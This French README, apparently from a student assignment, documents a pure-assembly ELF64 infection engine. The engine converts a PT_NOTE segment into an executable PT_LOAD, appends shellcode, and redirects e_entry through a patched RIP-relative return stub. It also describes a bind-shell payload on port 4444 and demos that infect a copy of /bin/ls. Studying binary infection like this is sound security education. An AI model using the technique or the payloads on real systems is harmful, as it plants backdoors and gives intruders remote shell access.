# Projet ELF — Personne A : Moteur d'infection en pur ASM

## 1. Objectif

Implémenter un moteur d'infection ELF64 (x86_64, Linux) en assembleur pur
(syscalls directs, pas de libc) qui :

- Parse un binaire ELF cible
- Repère un segment PT_NOTE inutile
- Le convertit en PT_LOAD exécutable
- Injecte un payload (shellcode) à la fin du fichier
- Patche le point d'entrée (e_entry) vers le payload
- Le payload s'exécute, puis rend le contrôle au binaire original

## 2. Architecture

elf_parser.asm — Moteur unique, deux modes :

- Mode lecture :   ./elf_parser <elf>              affiche l'en-tête + program headers
- Mode injection : ./elf_parser <elf> <payload>    infecte le binaire

Etapes de l'injection :

1. Parsing      : lecture des 64 octets du header ELF via open + read
2. Vérification : magic 0x7F 'E' 'L' 'F'
3. Lecture des phdrs : lseek(e_phoff) + read(e_phnum * 56)
4. Repérage     : recherche du premier PT_NOTE (type 4)
5. Conversion   : transformation en PT_LOAD (type 1) avec flags PF_R | PF_X
6. Placement    : calcul d'un offset et d'une vaddr libres (sans chevauchement)
7. Lecture payload : open + read du payload
8. Patch        : remplacement du placeholder par l'offset relatif vers e_entry
9. Redirection  : ehdr.e_entry = vaddr_payload
10. Écriture    : phdrs + header + payload dans le fichier

## 3. Technique d'infection ELF

### Conversion PT_NOTE -> PT_LOAD

- p_type   = PT_LOAD (1)
- p_flags  = PF_R | PF_X (5)
- p_offset = offset de fin de fichier (aligné sur 0x1000)
- p_vaddr  = vaddr libre (au-delà de tous les LOAD existants)
- p_filesz = p_memsz = taille du payload
- p_align  = 0x1000

### Placement sans chevauchement

Le loader Linux mappe les segments par pages de 0x1000 octets. Pour éviter
qu'un segment existant (souvent RW) ne partage une page avec notre segment
exécutable (ce qui casserait les permissions), on place notre segment :

- En offset : strictement après max(p_offset + p_filesz) de tous les LOAD
- En vaddr  : strictement après max(p_vaddr + p_memsz) de tous les LOAD

Alignement sur 0x1000 dans les deux cas, avec une page de marge.

### Retour à e_entry (ASLR-compatible)

Le shellcode contient un pattern :

  call $+5              e8 00 00 00 00    -> push rip
  pop rbx               5b                -> rbx = rip
  add rbx, imm32        48 81 c3 XX XX XX XX   <-- PATCHÉ
  jmp rbx               ff e3

Le moteur remplace imm32 par :

  imm32 = ancienne_entry - new_vaddr - offset_pattern + 1

Cette valeur est un décalage relatif à RIP, ce qui fonctionne avec ASLR
(binaires PIE). Le shellcode saute à l'adresse réelle de e_entry.

## 4. Payloads disponibles

- sc_msg.bin     : test retour e_entry (affiche INFECTE! puis saute à e_entry)
- bind_shell.bin : bind shell TCP port 4444

### Bind shell (obligation minimale)

- socket(AF_INET, SOCK_STREAM, 0)
- bind(sock, {0.0.0.0, 4444}, 16)
- listen(sock, 0)
- accept(sock, NULL, NULL)
- dup2(client, 0/1/2)
- execve("/bin/sh", NULL, NULL)

### sc_msg (démonstration du retour e_entry)

- write(1, "INFECTE!\n", 9)
- call $+5 ; pop rbx ; add rbx, imm32 ; jmp rbx -> saut vers e_entry

## 5. Compilation

### Moteur d'infection

  nasm -f elf64 elf_parser.asm -o elf_parser.o
  ld -o elf_parser elf_parser.o

Pas de libc : le moteur est 100% assembleur, utilise les syscalls Linux
directement (rax = numéro, arguments dans rdi, rsi, rdx, r10, r8, r9).

### Payloads

  # sc_msg.bin
  nasm -f elf64 sc_msg.asm -o sc_msg.o
  ld -o sc_msg sc_msg.o
  objcopy -O binary -j .text sc_msg sc_msg.bin

  # bind_shell.bin
  nasm -f elf64 bind_shell.asm -o bind_shell.o
  ld -o bind_shell bind_shell.o
  objcopy -O binary -j .text bind_shell bind_shell.bin

## 6. Utilisation

### Démo 1 — Retour e_entry (prouve le patch)

  cp /bin/ls ls_inf
  ./elf_parser ls_inf sc_msg.bin
  ./ls_inf --version
  # -> INFECTE! suivi de la version de ls

Résultat attendu à l'injection :

  [+] Mode INJECTION
  [+] PT_NOTE trouvé à l'index 7
  [+] PT_NOTE converti en PT_LOAD
  [+] Nouvel offset = 0x0000000000028000
  [+] Nouvelle vaddr = 0x000000000002a000
  [+] Placeholder(s) patché(s) : 1
  [+] Ancienne e_entry = 0x0000000000006760
  [+] Nouvelle e_entry = 0x000000000002a000

Puis à l'exécution :

  INFECTE!                    <- shellcode
  ls (GNU coreutils) 9.7      <- binaire original
  ...

### Démo 2 — Bind shell (prouve l'exécution du payload)

  cp /bin/ls ls_inf
  ./elf_parser ls_inf bind_shell.bin
  ./ls_inf                    # Terminal 1 : se bloque
  nc 127.0.0.1 4444           # Terminal 2 : shell
  whoami -> kali
  exit

### Démo 3 — Mode lecture

  ./elf_parser /bin/ls

Affiche les program headers du binaire (avant infection).

## 7. Limitation connue — Bind shell et retour e_entry

Le bind shell utilise execve("/bin/sh") qui remplace le processus par
un shell. Après cet execve, le contrôle ne revient jamais au binaire
original -> le retour à e_entry ne s'exécute pas.

C'est une limitation intrinsèque d'UNIX : execve ne retourne pas.

### Solutions théoriques (non implémentées)

1. Fork dans le shellcode :
   - Le père retourne à e_entry (binaire original continue)
   - Le fils exécute le bind shell
   -> Complexe à écrire en assembleur, mais possible.

2. Approche par hook : interception dynamique via GOT/PLT.

### Justification par rapport au PDF

Le PDF demande :
> Patch du point d'entrée + retour propre vers l'entry point original

Cette exigence est prouvée avec un payload non-bloquant (sc_msg.bin) :
le shellcode s'exécute, puis ls --version s'affiche intégralement, ce qui
montre que le retour à e_entry fonctionne.

Le bind shell, lui, répond à l'exigence d'exécution du payload au lancement.
Les deux aspects sont donc démontrés séparément, conformément au PDF.

## 8. Limitations résiduelles

- Segfault à l'exit du binaire infecté (avec sc_msg.bin) : dû au fait que
  le shellcode a écrit 8 octets dans la zone de pile initiale avant de
  restaurer rsp. Le binaire s'exécute intégralement mais crashe au moment
  de exit(). Cosmétique.
- Binaire ELF64 little-endian uniquement : pas de support ELF32 ni big-endian.
- Un seul PT_NOTE requis : pas de fallback si le binaire n'en a pas.
- Bug cosmétique mode lecture : les program headers s'affichent vides
  en mode lecture seule (le buffer n'est pas lu). Non bloquant.

## 9. Points techniques notables (ASM pur)

### Syscalls utilisés

  read   (0)  : Lire le header, les phdrs, le payload
  write  (1)  : Afficher les infos
  open   (2)  : Ouvrir les fichiers ELF et payload
  close  (3)  : Fermer les fichiers
  lseek  (8)  : Positionner le curseur
  exit   (60) : Quitter

### Registres et rôles

- r12 : argc, puis fd du fichier ELF
- r13 : pointeur vers argv, puis compteur
- r14 : argv[1], puis index
- r15 : argv[2], puis pointeur courant

### Fonctions internes

- lire_ehdr          : lit le header ELF
- lire_phdrs         : lit les program headers
- afficher_phdrs     : affiche les program headers
- convertir_pt_note  : trouve et convertit un PT_NOTE
- calculer_offsets   : calcule new_offset et new_vaddr
- lire_payload       : lit le payload
- patcher_payload    : patche le placeholder (offset relatif)
- ecrire_injection   : écrit phdrs + header + payload
- print_cstr, print_hex64, print_hex32, print_dec : affichage

## 10. Bilan

- Parsing ELF64                       : OK
- Vérification magic                  : OK
- Lecture des phdrs                   : OK
- Détection PT_NOTE                   : OK
- Conversion PT_NOTE vers PT_LOAD     : OK
- Calcul placement sans chevauchement : OK
- Lecture du payload                  : OK
- Patch placeholder (offset relatif)  : OK
- Écriture phdrs + header + payload   : OK
- Redirection e_entry                 : OK
- Test retour e_entry (sc_msg)        : OK
- Test bind shell (bind_shell)        : OK
- 100% ASM, sans libc                 : OK

## 11. Auteur

Personne A — Moteur d'infection ELF64 (côté ELF)
Projet ELF — Répartition binôme
